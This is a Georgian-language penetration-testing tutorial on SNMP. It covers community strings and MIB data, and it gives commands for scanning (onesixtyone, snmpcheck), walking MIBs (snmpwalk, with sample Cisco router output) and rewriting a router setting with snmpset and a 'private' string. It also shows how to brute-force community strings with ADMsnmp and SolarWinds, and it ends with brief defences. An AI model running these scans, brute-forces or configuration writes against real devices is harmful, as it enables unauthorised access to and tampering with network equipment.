# თეორია

SNMP სერვისი ელოდება კავშირს UDP პორტ 161-ზე. SNMP იმარება ქსელური მოწყობილობების გასამართად (როუტერი, პრინეტრი, ...).
SNMP-ესთან აუთენთირება მარტივია და ტექსტის ფორმით მოძრაობს ქსელში. SNMP Management Information Base (MIB) მონაცემების მოპოვება შესაძლოა წასაკითხი community string-ების მეშვეობით, MIB-ში მონაცემების შეცვლისთვის კი ჩასაწერი community string-ებია საჭირო. MIB მონაცემების ბაზაში არის Object Identifier (OID) მონაცემები, როგორიცაა როუტერის მასივი, სტატისტიკა ქსელის შესახებ, ქსელური ინტერფეისების შესახებ. რა თქმა უნდა როუტერის მასივის ნახვა საინტერესოა შიდა ქსელში მყოფი კომპიუტერების დასადგენად.
სხვადასხვა მოწყობილობას თავისებური სპეციფიკური community string-ები მოჰყვება.
SNMP პროტოკოლის სამი ვერსია არსებობს, მესამე ვერსია უფრო დაცულია და მაშასადამე ეს უფრო პირვერ და მეორე ვერსიას ეხება.

მოკლე სტატია SNMP პროტოკოლის შესახებ: http://www.tech-faq.com/snmp.html

# onesixtyone

onesixtyone-ი არის SNMP-ს სკანერი.

```
# onesixtyone 192.168.1.254
```

# snmpcheck

snmpcheck-ით ინფორმაციას მოიპოვთ SNMP მოწყობილობის შესახებ.

```
# snmpcheck -t 192.168.1.254
```

# MIB-თან მიწვდომა

## snmpwalk

ხელსაწყო snmpwalk-ი არის snmp პაკეტის ერთ-ერთი პროგრამა, მას შეუძლია community string-ის გამოყენებით ნახოს MIB მონაცემთა ბაზაში შეტანილი ინფორმაცია


snmpwalk-ით Cisco როუტერის MIB მონაცებთა ბაზის ნახვა. რახან ბევრი ინფორმაციაა მხოლოდ პირველი ნაწილია ნაჩვენები.

```
# snmpwalk -c public 192.168.0.1

system.sysDescr.0 = Cisco Internetwork Operating System Software IOS

(tm) C2600 Software (C2600-IS-M), Version 12.0(6), RELEASE SOFTWARE

(fc1) Copyright (c) 1986-1999 by cisco Systems, Inc. Compiled Wed

11-Aug-99 00:16 by phanguye

system.sysObjectID.0 = OID: enterprises.9.1.186

system.sysUpTime.0 = Timeticks: (86128) 0:14:21.28

system.sysContact.0 = 

system.sysName.0 = pipex-gw.trustmatta.com

system.sysLocation.0 = 

system.sysServices.0 = 78

system.sysORLastChange.0 = Timeticks: (0) 0:00:00.00
```

სხვა გამოყემება:

```
# snmpwalk -v 2c -c public -O T -L f snmpwalk.txt 192.168.0.11
```

ამ მაგალითში ვიყენებთ snmp პროტოკოლის მეორე ვერსიას (-v 2c), ვეძებთ public community string-ებს (-c public), ადამიანისთვის გასაგები ტექსტის ბეჭვდა (-O T), ლოგების ჩაწერა snmpwalk.txt ფაილში (-L f snmpwalk.txt), იპ მისამართი 192.168.0.11.

snmpwalk-ის შესახებ: http://net-snmp.sourceforge.net/wiki/index.php/TUT:snmpwalk

## მონაცემების შეცვლა

გარკვეული მონაცემი რომ შეცვალო MIB მონაცემთა ბაზაში უნდა გაოიყენო ხელსაწყო snmpset.

მაგალითი:

```
# snmpset -r 3 -t 3 192.168.0.1 private .1.3.6.1.4.1.9.2.1.55.192.\

    168.0.50 s "cisco-config"
```

# სისუსტეების დადგენა

## NETWOX/NETWAG (ვინდოუსი ან იუნიქსი)

**წინა პირობა**

SNMP სერვისი უნდა იყოს გაშვებული მსხვერპლის კომპიუტერში. NETWOX ან NETWAG (გრაფიკული ვარიანტი) გაძლევთ საშუალებას რომ გაეცნოთ ინფორმაციებს მსხვერპლის SNMP სერვისის მიერ.

NETWAG-ში აირჩიე ნომერი 160 - SNMP WALK.

# SNMP-ს community string-ების გატეხვა

SNMP community strings ბრუტფორსი შესაძლოა SolarWInds პროგრამის მიერ

## იუნიქსი

### ADMsnmp

შეგიძლიათ იგი მოიპოვოთ შემდეგ მისამართზე: http://adm.freelsd.net/ADM/.

```
# ADMsnmp 192.168.0.1

ADMsnmp vbeta 0.1 (c) The ADM crew

ftp://ADM.isp.at/ADM/

greets: !ADM, el8.org, ansia

>>>>>>>>>>> get req name=root  id = 2 >>>>>>>>>>>
>>>>>>>>>>> get req name=public   id = 5 >>>>>>>>>>>
>>>>>>>>>>> get req name=private  id = 8 >>>>>>>>>>>
>>>>>>>>>>> get req name=write  id = 11 >>>>>>>>>>>
<<<<<<<<<<< recv snmpd paket id = 9 name = private ret =0 <<<<<<<<<
>>>>>>>>>>>> send setrequest id = 9 name = private >>>>>>>>
>>>>>>>>>>> get req name=admin  id = 14 >>>>>>>>>>>
<<<<<<<<<<< recv snmpd paket id = 10 name = private ret =0 <<<<<<<<
>>>>>>>>>>> get req name=proxy  id = 17 >>>>>>>>>>>
<<<<<<<<<<< recv snmpd paket id = 140 name = private ret =0 <<<<<<<
>>>>>>>>>>> get req name=ascend  id = 20 >>>>>>>>>>>
<<<<<<<<<<< recv snmpd paket id = 140 name = private ret =0 <<<<<<<
>>>>>>>>>>> get req name=cisco  id = 23 >>>>>>>>>>>
>>>>>>>>>>> get req name=router  id = 26 >>>>>>>>>>>
>>>>>>>>>>> get req name=shiva  id = 29 >>>>>>>>>>>
>>>>>>>>>>> get req name=all private  id = 32 >>>>>>>>>>>
>>>>>>>>>>> get req name= private  id = 35 >>>>>>>>>>>
>>>>>>>>>>> get req name=access  id = 38 >>>>>>>>>>>
>>>>>>>>>>> get req name=snmp  id = 41 >>>>>>>>>>>



<!ADM!>         snmp check on pipex-gw.trustmatta.com       <!ADM!>

sys.sysName.0:pipex-gw.trustmatta.com

name = private write access
```


## ვინდოუსი

### SolarWInds

SolarWInds არის კომერციული პროგრამა (30 დღე უფასოია; რამოდნიმე წამი შეიძლება თავდასხმის განხორციელება) გრაფიკული ინტერფეისით. მას შუძლია SNMP community strings ბრუტფორსი. SNMP-ის გარდა მას სხვა შესაძლებლობებიც აქვს.

პროგრამაში შეარჩიეთ: Security -> SNMP Bruteforce attack

როდესაც თავდამსხმელი აღმოაჩენს read-only community string, მას შეუძლია რომ ინფორმაციაბი ნახოს მსხვერპლის ქსელის შესახებ SNMP-ს მეშვეობით. შემთხვევაში მას შეუძლია გაეცნოს managed device მოწყობილობების ინფორნაციებს, შეცვალოს პარამეტრები (კონფიგურირება), ან სულაც გამორთოს კომპიუტერი.


# დაცვა

bastion servers/workstations, host-based firewalls, ძლიერი პაროლები, ძნელად გამოსაცნობი community string-ები.
